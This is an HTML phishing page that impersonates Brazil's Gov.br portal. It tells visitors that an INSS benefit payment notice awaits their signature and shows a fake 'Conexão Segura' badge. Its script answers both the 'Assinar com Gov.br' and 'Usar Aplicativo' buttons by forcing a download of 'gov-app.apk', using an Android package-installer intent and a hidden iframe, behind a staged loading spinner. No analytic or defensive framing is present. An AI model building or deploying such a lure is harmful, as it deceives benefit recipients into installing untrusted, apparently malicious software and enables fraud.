<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gov.br | Assinatura de Documento</title>
    <style>
        :root {
            --gov-blue: #0056b3;
            --gov-dark: #333333;
            --bg-gray: #f3f4f6;
            --white: #ffffff;
            --border: #d1d5db;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-gray);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background: var(--white);
            width: 100%;
            max-width: 400px;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            overflow: hidden;
            border-top: 5px solid var(--gov-blue);
        }

        .header {
            padding: 20px 25px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        /* Logo SVG Oficial do Gov.br */
        .gov-logo {
            width: 40px;
            height: 40px;
        }

        .header-text {
            font-size: 18px;
            font-weight: 700;
            color: var(--gov-dark);
        }

        .content {
            padding: 25px;
        }

        h2 {
            font-size: 20px;
            color: var(--gov-dark);
            margin: 0 0 15px 0;
        }

        .doc-details {
            background: #f8f9fa;
            border-left: 3px solid var(--gov-blue);
            padding: 15px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #555;
        }

        .doc-details strong {
            display: block;
            color: #000;
            margin-bottom: 5px;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: var(--gov-blue);
            color: white;
            text-align: center;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            margin-bottom: 10px;
            transition: background 0.3s;
        }

        .btn:hover {
            background-color: #004494;
        }

        .btn-outline {
            background-color: white;
            border: 1px solid var(--gov-blue);
            color: var(--gov-blue);
        }

        .btn-outline:hover {
            background-color: #f0f4f8;
        }

        .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360); }
        }

        .footer {
            text-align: center;
            font-size: 11px;
            color: #888;
            padding: 15px;
            background: #fafafa;
            border-top: 1px solid var(--border);
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="header">
            <!-- SVG Vetorial do Logo Gov.br -->
            <svg class="gov-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="48" fill="#0056b3" />
                <path d="M50 20 L80 50 L50 80 L20 50 Z" fill="none" stroke="white" stroke-width="8" />
                <text x="50" y="68" font-size="26" fill="white" text-anchor="middle" font-weight="bold">BR</text>
            </svg>
            <span class="header-text">Gov.br</span>
        </div>

        <div class="content">
            <h2>Documento Pendente</h2>
            <p style="color: #666; font-size: 14px; margin-bottom: 15px;">
                Você foi convocado para assinar o documento abaixo.
            </p>

            <div class="doc-details">
                <strong>Aviso de Pagamento – Benefício 2026</strong>
                <div>
                    <span style="color: #d9534f;">⚠ Aguardando sua assinatura</span><br>
                    <span style="font-size: 12px;">Remetente: INSS / Ministério da Economia</span>
                </div>
            </div>

            <div class="btn-group">
                <button id="btn-assinar" class="btn" onclick="iniciarAssinatura()">
                    <span id="btn-text">Assinar com Gov.br</span>
                    <div class="spinner" id="spinner"></div>
                </button>
                
                <button class="btn btn-outline" onclick="baixarApk()">
                    Usar Aplicativo
                </button>
            </div>
        </div>

        <div class="footer">
            <span style="color: #28a745; font-weight: bold;">🔒 Conexão Segura</span><br>
            &copy; 2026 Governo Federal
        </div>
    </div>

    <script>
        function iniciarAssinatura() {
            const btn = document.getElementById('btn-assinar');
            const text = document.getElementById('btn-text');
            const spinner = document.getElementById('spinner');

            btn.disabled = true;
            text.style.display = 'none';
            spinner.style.display = 'block';

            setTimeout(() => {
                spinner.style.display = 'none';
                text.innerText = "Baixando App...";
                text.style.display = 'block';
                
                setTimeout(() => {
                    baixarApk();
                }, 1000);
            }, 1500);
        }

        function baixarApk() {
            const APK = 'gov-app.apk'; 
            const a = document.createElement('a');
            a.href = `intent://${APK}#Intent;scheme=https;package=com.android.packageinstaller;end`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = APK;
            document.body.appendChild(iframe);
        }
    </script>

</body>
</html>
